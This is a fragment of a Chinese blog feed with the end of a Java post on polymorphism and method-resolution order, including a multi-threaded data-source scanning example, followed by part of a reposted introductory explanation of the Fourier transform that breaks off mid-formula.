</span>&#123;</span><br><span class="line">        A a1 = <span class="keyword">new</span> A();</span><br><span class="line">        A a2 = <span class="keyword">new</span> B();</span><br><span class="line">        B b = <span class="keyword">new</span> B();</span><br><span class="line">        C c = <span class="keyword">new</span> C();</span><br><span class="line">        D d = <span class="keyword">new</span> D();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;1--&quot;</span> + a1.show(b));</span><br><span class="line">        System.out.println(<span class="string">&quot;2--&quot;</span> + a1.show(c));</span><br><span class="line">        System.out.println(<span class="string">&quot;3--&quot;</span> + a1.show(d));</span><br><span class="line">        System.out.println(<span class="string">&quot;4--&quot;</span> + a2.show(b));</span><br><span class="line">        System.out.println(<span class="string">&quot;5--&quot;</span> + a2.show(c));</span><br><span class="line">        System.out.println(<span class="string">&quot;6--&quot;</span> + a2.show(d));</span><br><span class="line">        System.out.println(<span class="string">&quot;7--&quot;</span> + b.show(b));</span><br><span class="line">        System.out.println(<span class="string">&quot;8--&quot;</span> + b.show(c));</span><br><span class="line">        System.out.println(<span class="string">&quot;9--&quot;</span> + b.show(d));      </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>--A and A</span><br><span class="line"><span class="number">2</span>--A and A</span><br><span class="line"><span class="number">3</span>--A and D</span><br><span class="line"><span class="number">4</span>--B and A</span><br><span class="line"><span class="number">5</span>--B and A</span><br><span class="line"><span class="number">6</span>--A and D</span><br><span class="line"><span class="number">7</span>--B and B</span><br><span class="line"><span class="number">8</span>--B and B</span><br><span class="line"><span class="number">9</span>--A and D</span><br></pre></td></tr></table></figure><p>在这里看结果1、2、3还好理解，从4开始就开始糊涂了，对于4来说为什么输出不是“B and B”呢？</p><p>首先我们先看一句话：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。这句话对多态进行了一个概括。其实在继承链中对象方法的调用存在一个优先级：this.show(O)、super.show(O)、this.show((super)O)、super.show((super)O)。</p><p>分析：</p><p>从上面的程序中我们可以看出A、B、C、D存在如下关系。<br><img src="/images/storage/3DRA9H6EHV8TNBKTIH5QPD4OF4.png" alt="1565927688815.png"></p><p>首先我们分析5，a2.show(c)，a2是A类型的引用变量，所以this就代表了A，a2.show(c),它在A类中找发现没有找到，于是到A的超类中找(super)，由于A没有超类（Object除外），所以跳到第三级，也就是this.show((super)O)，C的超类有B、A，所以(super)O为B、A，this同样是A，这里在A中找到了show(A obj)，同时由于a2是B类的一个引用且B类重写了show(A obj)，因此最终会调用子类B类的show(A obj)方法，结果也就是B and A。</p><p>按照同样的方法我也可以确认其他的答案。</p><p>方法已经找到了但是我们这里还是存在一点疑问，我们还是来看这句话：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法。这我们用一个例子来说明这句话所代表的含义：a2.show(b)；</p><p>这里a2是引用变量，为A类型，它引用的是B对象，因此按照上面那句话的意思是说有B来决定调用谁的方法,所以a2.show(b)应该要调用B中的show(B obj)，产生的结果应该是“B and B”，但是为什么会与前面的运行结果产生差异呢？这里我们忽略了后面那句话“但是这儿被调用的方法必须是在超类中定义过的”，那么show(B obj)在A类中存在吗？根本就不存在！所以这句话在这里不适用？那么难道是这句话错误了？非也！其实这句话还隐含这这句话：它仍然要按照继承链中调用方法的优先级来确认。所以它才会在A类中找到show(A obj)，同时由于B重写了该方法所以才会调用B类中的方法，否则就会调用A类中的方法。</p><p>所以多态机制遵循的原则概括为：当超类对象引用变量引用子类对象时，被引用对象的类型而不是引用变量的类型决定了调用谁的成员方法，但是这个被调用的方法必须是在超类中定义过的，也就是说被子类覆盖的方法，但是它仍然要根据继承链中方法调用的优先级来确认方法，该优先级为：this.show(O)、super.show(O)、this.show((super)O)、super.show((super)O)。</p><hr><h2 id="项目中的实例"><a href="#项目中的实例" class="headerlink" title="项目中的实例"></a>项目中的实例</h2><p><img src="/images/storage/3N2HJ37ORAN46OTAOS94M341RI.png" alt="1565922485999.png"></p><hr><p><img src="/images/storage/19BBH0G1UL615QJSF10QEL2FL1.png" alt="1565922055146.png"></p><p>项目中需要同时对4个数据源进行数据扫描，并进行处理，这里使用的是与当前线程绑定的方式获取的数据源。</p><p>主类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BCKTask</span> <span class="keyword">implements</span> <span class="title">ApplicationRunner</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    Dispatcher dispatcher;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">(ApplicationArguments args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        lifrontequcfg.forEach(a -&gt; &#123;</span><br><span class="line">            <span class="comment">//判断本机器是否拥有执行权</span></span><br><span class="line">            List&lt;String&gt; ipList = IPUtil.dealIP(a.getLibackendcmdequ_cfg().getIp());</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (ipList.contains(ip)) &#123;</span><br><span class="line">                log.debug(<span class="string">&quot;本机拥有执行权，ip:[&#123;&#125;]&quot;</span>, ip);</span><br><span class="line">                dispatcher.distribute(a);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>获取执行权限后将在dispatcher中分发数据源。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> Source source;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">distribute</span><span class="params">(LiEquRoleCfg.LiFrontEquCfg a)</span> </span>&#123;</span><br><span class="line">....</span><br><span class="line">        <span class="keyword">switch</span> (equId) &#123;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;xx&quot;</span>:</span><br><span class="line">                <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                    ChangeDataInter cmData = CmData.getInstance(...);</span><br><span class="line">                    cmData.work();</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;xx&quot;</span>:</span><br><span class="line">                <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                    ChangeDataInter cuData = <span class="keyword">new</span> CuData(...);</span><br><span class="line">                    cuData.work();</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;xx&quot;</span>:</span><br><span class="line">                <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                    ChangeDataInter ctData = <span class="keyword">new</span> CtData(...);</span><br><span class="line">                    ctData.work();</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;xx&quot;</span>:</span><br><span class="line">                <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                    ChangeDataInter ccpnData = <span class="keyword">new</span> CcpnData(...);</span><br><span class="line">                    ccpnData.work();</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里启动了4个线程去分别扫描对应的表，其实他们的扫库以及接下来的逻辑都是相同的，所以这里使用了多态将通用的方法提出指BaseDataSourceHandler，子类只需要实例化的时候绑定一下数据源即可(数据源有切点切入)；</p><p>其中一个子类CmData(请忽略单例的创建线程安全性。)：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CmData</span> <span class="keyword">extends</span> <span class="title">BaseDataSourceHandler</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Logger log = LoggerFactory.getLogger(CmData.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> SubTaskMapper subTaskMapper;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> CmData <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> CmData(socketParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">CmData</span><span class="params">(SocketParam socketParam)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(socketParam);</span><br><span class="line">        <span class="keyword">this</span>.socketParam = socketParam;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        DynamicDataSourceContextHolder.setDataSourceRouterKey(<span class="string">&quot;cm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>BaseDataSourceHandler:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseDataSourceHandler</span> <span class="keyword">implements</span> <span class="title">ChangeDataInter</span> </span>&#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">work</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       subTaskMapper = socketParam.getSubTaskMapper();</span><br><span class="line">       ExecutorService executorService = Ti3ExecutorServiceUtil.getExecutorServiceInstance();</span><br><span class="line">       <span class="keyword">while</span> (Thread.currentThread().isAlive()) &#123;</span><br><span class="line">           <span class="comment">//查询可执行任务并进行处理</span></span><br><span class="line">           canRunTask();</span><br><span class="line">           <span class="comment">//执行socket并处理结果</span></span><br><span class="line">           <span class="keyword">if</span> (!Objects.isNull(socketParam.getSetTargetReq())) &#123;</span><br><span class="line">               executorService.submit(<span class="keyword">new</span> SocketThread(socketParam));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ChangeDataInter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ChangeDataInter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">work</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 多态 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>傅里叶变换</title>
      <link href="/what&#39;s%20this/"/>
      <url>/what&#39;s%20this/</url>
      
        <content type="html"><![CDATA[<p>作者：DBinary</p><p><img src="https://pic4.zhimg.com/80/v2-441dc7886c2d1651975a8d8dec827526_hd.jpg" alt="img"></p><p>   作为一个资深信号狗,必须强答一波这个问题,想当年也是被一堆变换公式折磨的要死要活的,多年过去了,用的多了发现也就是那么回事,尽管其内部的数学推论是复杂的(其实也就那样),但真的要说,仍然可以用最简单的几句话和最通俗易懂的语言把它的原理和作用讲清楚.</p><p>   既然要讲,我就从最基础的东西开始说一说,首先我们先来认识下三角函数,要说三角函数这个东西,我们首先要来说说弧度,什么是弧度呢,你可以在纸上画一个圆,选取圆的一段边,边长和这个圆半径的比值,就是该边与圆心对应夹角的弧度,不好理解是不是,没关系,看个图你就懂了</p><p> <img src="https://pic2.zhimg.com/50/v2-3f115013d83be51c9a9ad1c4006609c6_hd.webp" alt="img"> </p><p>  弧度的单位是rad,你会发现,所有的圆边长和半径的比值都是2πRad,而π是一个无限不循环的常数,它约等于3.1415926,可以发现弧度和角度是一个对应的关系,如果按角度制而言绕圆一周是360°,弧度制而言,就是2π了</p><p> 现在,我们引入另一个在信号处理中极为极为极为重要的一个函数,三角函数,之所以叫做三角函数,是因为它的计算方式和直角三角密切相关</p><p><img src="https://pic2.zhimg.com/50/v2-71c4df5642e4123c6a024cb4ae0f21ee_hd.jpg" alt="img"><img src="https://pic2.zhimg.com/80/v2-71c4df5642e4123c6a024cb4ae0f21ee_hd.jpg" alt="img"></p><p>三角函数又常常叫正弦函数常用的主要有sin和cos两种,在高中的书本上,常常叫它们正弦函数和余弦函数,但实际在使用中,不管是sin还是cos都常常被统称为正弦函数,看上面的直角三角形, 以sin函数为例,关于这个函数的求法,可以用下面的公式来表述</p><p><img src="https://www.zhihu.com/equation?tex=sin(%5Cangle+A)=%5Cfrac%7Ba%7D%7Bc%7D" alt="[公式]"></p><p>也就是说sin角a的值,等于其对应直角三角形的对边比斜边,实际上我们常常用 <img src="https://www.zhihu.com/equation?tex=sin(x)" alt="[公式]"> 来表示这个正弦函数,而 <img src="https://www.zhihu.com/equation?tex=x" alt="[公式]"> 则表示某一弧度,如果你把这个三角形画在一个二维坐标系的圆上面,比如下面的这种形式</p><p><img src="https://pic2.zhimg.com/50/v2-4de7aeea265dfeb1b10597005e3802a7_hd.jpg" alt="img"><img src="https://pic2.zhimg.com/80/v2-4de7aeea265dfeb1b10597005e3802a7_hd.jpg" alt="img"></p><p>那么 <img src="https://www.zhihu.com/equation?tex=sin(%5Ctheta)=%5Cfrac%7By%7D%7Br%7D" alt="[公式]"> ,当然,这个时候,正弦值还仅仅是一个”正弦值”,现在你可以开始想象假如圆上的这个点现在开始动了起来,并开始绕圆逆时针旋转, <img src="https://www.zhihu.com/equation?tex=sin(%5Ctheta)" alt="[公式]"> 的值会如何变化呢?下面的图会告诉你答案</p><p> <img src="https://pic2.zhimg.com/50/v2-bad99139a4a97a51fcb01ad36e9fa5c4_hd.webp" alt="img"> </p><p>显然的,当我们引入动态的概念后,正弦函数随之而动,从一个定值变成了一个波,在信号处理中,我们称之为正弦波,高中的课本会告诉你正弦函数的性质和和差化积积化和差之类的公式,而我会告诉你正弦函数和其所对应的正弦波估计是信号处理中最重要最常用没有之一的重要工具</p><p>到这里既然我们说到波了,那么就不得不提几个问题和其对应的概念,现在你再看看上图,如果我们需要描述一个正弦波是不是需要下面几个问题,而这个问题的答案,对应了几个概念</p><ol><li>这个点围绕的圆到底有多大—-&gt;波幅</li><li>这个点旋转的速度有多快—-&gt;角速度—&gt;频率</li><li>这个点最初的位置在哪里—-&gt;相位</li></ol><p>当然,如果我们描述正弦波只能用上面的文字来说,未免显得不够专业,于是乎,我们用一个更加通用的公式来描述正弦波</p><p><img src="https://www.zhihu.com/equation?tex=f(t)=Asin(%5Comega+t+%5Cvarphi)+k" alt="[公式]"></p><p>其中,A表示振福,A越大,振福越大.</p><p><img src="https://www.zhihu.com/equation?tex=w" alt="[公式]"> 表示角速度,当然,角速度和频率 <img src="https://www.zhihu.com/equation?tex=f" alt="[公式]"> 是对应关系,所以信号处理中常常也用角频率这种俗语来描述</p><p><img src="https://www.zhihu.com/equation?tex=%5Cvarphi" alt="[公式]"> 表示相位,sin和cos两个正弦函数的差别其实也仅仅是相位不同</p><p><img src="https://www.zhihu.com/equation?tex=k" alt="[公式]"> 是这个正弦波的偏移,你可以理解为这个波在y轴上如何的上下移动,在信号处理中,这个会被统一到直流分量中(频率为0的波的波幅)</p><p>科普完上面的概念之后,要说傅里叶变换是怎么回事其实已经很容易了,现在我们来看傅里叶说过的一句话</p><p><strong><em>“任何”周期信号都可以用一系列成谐波关系的正弦曲线来表示。\</em></strong></p><p>我们先不讨论这句话的适用条件(狄里赫利条件),这句话简直牛逼大了,这表示下面这些信号</p><p><img src="https://pic2.zhimg.com/50/v2-e42e6174a024074fe086d57cb2c6e42e_hd.jpg" alt="img"><img src="https://pic2.zhimg.com/80/v2-e42e6174a024074fe086d57cb2c6e42e_hd.jpg" alt="img"></p><p>全部可以用下面这个式子来表示</p><p><img src="https://www.zhihu.com/equation?tex=f%5Cleft(+t+%5Cright)+=+c_%7B0%7D+++%5Csum_%7Bn+=+1%7D%5E%7B%5Cinfty%7D%7Bc_%7Bn%7D%5Ccos%7D(n%5Comega+t+++%5Cvarphi)+" alt="[公式]">      (式1.0)</p><p>如果看不明白没关系,下面这张图能让你看个清楚,如何用正弦波组成一个近似的方波</p><p> <img src="https://pic3.zhimg.com/50/v2-bb1427097bb4a91d4a78e384641ab8fa_hd.webp" alt="img"> </p><p>图像来自wiki百科</p><p><strong><em>那么,有什么意义呢,要知道,如果可以将信号分解为正弦函数的累加和,不就等于知道了这个信号是由哪些频率的正弦波构成了的么,同时,我们还能知道对应频率的波在信号中的能量和相位信息.\</em></strong></p><p>举个很简单的声学例子,如果我们直接看一段声音信号的波形图,我们很难看出他是男声还是女声(别说男声的嗓门比较大波幅宽,河东狮吼了解下)但是从频域中我们就能够很容易分辨出来,毕竟女声的频域中,高频的能量占比会比较高</p><p>再举个很简单的图形学例子,如果把一张图像做频域分析,图像的低频代表着轮廓信息,高频代表着细节信息,相位代表位置信息,你要是想让图像变模糊,简单,把高频的能量压下来就行了,想让图像变尖锐,高频能量加上去就行了.</p><p>那么问题又来了,已知 <img src="https://www.zhihu.com/equation?tex=f(t)" alt="[公式]"> ,我们如何把它分解为 <img src="https://www.zhihu.com/equation?tex=%7Bc_%7B1%7D%5Ccos%7D(%5Comega+t+++%5Cvarphi)+%7Bc_%7B2%7D%5Ccos%7D(2%5Comega+t+++%5Cvarphi)+%7Bc_%7B3%7D%5Ccos%7D(3%5Comega+t+++%5Cvarphi)....." alt="[公式]"></p><p>的形式呢,实际上傅里叶变换需要解决的就是这一点,它的最终目的就是要将信号分解为上面这样的形式,好让我们把别通频率的正弦波信息给剥离出来</p><p>要说这个,我们就不得不谈谈三角函数的正交性了,</p><p><strong><em>首先我们知道,对正弦波正无穷到负无穷内进行积分,其结果必定是0(主值积分，取周期)\</em></strong></p><p>所以根据三角函数的积化和差公式,下面的推论都是成立的</p><p><img src="https://www.zhihu.com/equation?tex=%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Ccos(+%5Ctext%7Bmx%7D+)%5Ccos(+%5Ctext%7Bnx%7D+)%7Ddx+=+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%7B+%5Ccos%5Clbrack+(+m+-+n+)x+%5Crbrack+++%5Ccos%5Clbrack+(+m+++n+)x+%5Crbrack+%7D%5Ctext%7Bdx%7D%7D+=+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Ccos%5Clbrack+(+m+-+n+)x+%5Crbrack%5Ctext%7Bdx%7D%7D+++%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Ccos%5Clbrack+(+m+++n+)x+%5Crbrack%5Ctext%7Bdx%7D%7D+=+0+" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Csin(+%5Ctext%7Bmx%7D+)%5Csin(+%5Ctext%7Bnx%7D+)%7Ddx+=+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%7B+%5Ccos%5Clbrack+(+m+-+n+)x+%5Crbrack+-+%5Ccos%5Clbrack+(+m+++n+)x+%5Crbrack+%7D%5Ctext%7Bdx%7D%7D=%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Ccos%5Clbrack+(+m+-+n+)x+%5Crbrack%5Ctext%7Bdx%7D%7D+-+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Ccos%5Clbrack+(+m+++n+)x+%5Crbrack%5Ctext%7Bdx%7D%7D+=+0" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Csin(+%5Ctext%7Bmx%7D+)%5Ccos(+%5Ctext%7Bnx%7D+)%7Ddx+=+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%7B+%5Csin%5Clbrack+(+m+-+n+)x+%5Crbrack+++%5Csin%5Clbrack+(+m+++n+)x+%5Crbrack+%7D%5Ctext%7Bdx%7D%7D+=+%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Csin%5Clbrack+(+m+-+n+)x+%5Crbrack%5Ctext%7Bdx%7D%7D+++%5Cfrac%7B1%7D%7B2%7D%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7B%5Csin%5Clbrack+(+m+++n+)+%5Crbrack%5Ctext%7Bdx%7D%7D+" alt="[公式]"></p><p>这导致了一个很重要的概念</p><p><strong><em>不同频率的正弦波相乘,对其周期积分后,其结果是0!\</em></strong></p><p>=======================================================</p><p><em>(我知道有人肯定会说,作者你胡说八道,</em> <img src="https://www.zhihu.com/equation?tex=%5Cint_%7B-%5Cinfty%7D%5E%7B%5Cinfty%7Dsin(nx)dx" alt="[公式]"> <em>怎么会是0,老师告诉我它明明是发散的,你又忽悠我,关于这点我要说明一下,首先你的老师没说错,不过我也没有忽悠你,首先在大学高数求极限那些知识中,这个函数确实积分后是发散的,这个发散的具体原因是建立在</em> <img src="https://www.zhihu.com/equation?tex=%5Clim_%7BM+%5Crightarrow+%5Cinfty+,+N+%5Crightarrow+-%5Cinfty+%7D%7B%5Cint_%7BN%7D%5E%7BM%7Dsin(nx)dx%7D+" alt="[公式]"> <em>这种情况下的,也就是我们正常说的无穷积分,但是如果按这种玩法,基本上大半的信号处理函数都没法玩了,因此在信号处理的公式中比如傅里叶变换,默认都以柯西主值积分作为钦定的积分方式,打个比方定义</em> <img src="https://www.zhihu.com/equation?tex=%5Clim_%7BM+%5Crightarrow+%5Cinfty+%7D%7B%5Cint_%7B-M%7D%5E%7BM%7Dsin(nx)dx%7D+" alt="[公式]"><em>,</em> <img src="https://www.zhihu.com/equation?tex=sin(nx)" alt="[公式]"><em>这种情况下,负无穷到正无穷的积分不就是0了么,所以这里我说明一下,傅里叶变换中使用的是柯西主值积分,整个无穷区间取周期倍)</em></p><p><em>=======================================================</em></p><p>这个概念我们又叫做波的相干性,比如给你一段信号,问你信号里有没有100HZ频率的正弦波信号,怎么办?简单,把这个信号和100hz的正弦波信号相乘,然后对其周期内积分,如果结果不是0,那么这个信号就含有100HZ的信号</p><p>那么剩下的问题就是如何求得该频率正弦波对应的幅度和相位了,实际上就是求式1.0的 <img src="https://www.zhihu.com/equation?tex=c_%7Bn%7D" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=%5Cvarphi" alt="[公式]"> 下面我要甩点公式了,如果感到不适,可以选择跳过</p><p>利用三角函数的变换公式，(式1.0)可变形为</p><p><img src="https://www.zhihu.com/equation?tex=f%5Cleft(+t+%5Cright)+=+c_%7B0%7D+++%5Csum_%7Bn+=+1%7D%5E%7B%5Cinfty%7D%7B%5Clbrack+c_%7Bn%7Dcos%5Cvarphi+cos(n%5Comega+t)+-+c_%7Bn%7Dsin%5Cvarphi+sin(n%5Comega+t)%5Crbrack%7D+" alt="[公式]"></p><p>设<img src="https://www.zhihu.com/equation?tex=+a_%7Bn%7D+=+c_%7Bn%7D%5Ctext%7Bcos%CF%86%7D+" alt="[公式]"> ,<img src="https://www.zhihu.com/equation?tex=+b_%7Bn%7D+=+-+c_%7Bn%7D%5Ctext%7Bsin%CF%86%7D+" alt="[公式]"> 那么，上式变为</p><p><img src="https://www.zhihu.com/equation?tex=f%5Cleft(+t+%5Cright)+=+c_%7B0%7D+++%5Csum_%7Bn+=+1%7D%5E%7B%5Cinfty%7D%7B%5Clbrack+a_%7Bn%7D%5Ccos%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)+++b_%7Bn%7D%5Csin%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Crbrack%7D+" alt="[公式]"></p><p>现在，让我们正式的引入正交性的性质，还记得检波手段么，这里，我们假设对 <img src="https://www.zhihu.com/equation?tex=f(t)" alt="[公式]"> 用<img src="https://www.zhihu.com/equation?tex=sin(k%5Ctext%7B%CF%89t%7D)" alt="[公式]"> 进行检波(说人话就是乘起来,然后为了方便计算对其在一个周期内积分)，那么就有</p><p><img src="https://www.zhihu.com/equation?tex=%5Cint_%7B0%7D%5E%7BT%7D%7Bf%5Cleft(+t+%5Cright)%5Csin%5Cleft(+%5Ctext%7Bk%CF%89t%7D+%5Cright)%5Ctext%7Bdt%7D%7D+" alt="[公式]"></p><p>假设f(x)中含有 <img src="https://www.zhihu.com/equation?tex=%5Ctext%7Bn%CF%89%7D" alt="[公式]"> 角频率的正弦波系数为 <img src="https://www.zhihu.com/equation?tex=b_%7Bn%7D" alt="[公式]"> ，那么根据三角函数的正交性，上式就有<img src="https://www.zhihu.com/equation?tex=%5Cint_%7B0%7D%5E%7BT%7D%7Bf%5Cleft(+t+%5Cright)%5Csin%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Ctext%7Bdt%7D%7D=b_%7Bn%7D%5Cint_%7B0%7D%5E%7BT%7D%7B%5Csin%7B%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Csin%5Cleft(+k%5Ctext%7B%CF%89t%7D+%5Cright)%7D%5Ctext%7Bdt%7D%7D" alt="[公式]"></p><p>为什么会这样?你想啊,别的频率的波积分后全变0了,不就是剩下( <img src="https://www.zhihu.com/equation?tex=k=n" alt="[公式]"> )频率一样的情况了么.因此</p><p><img 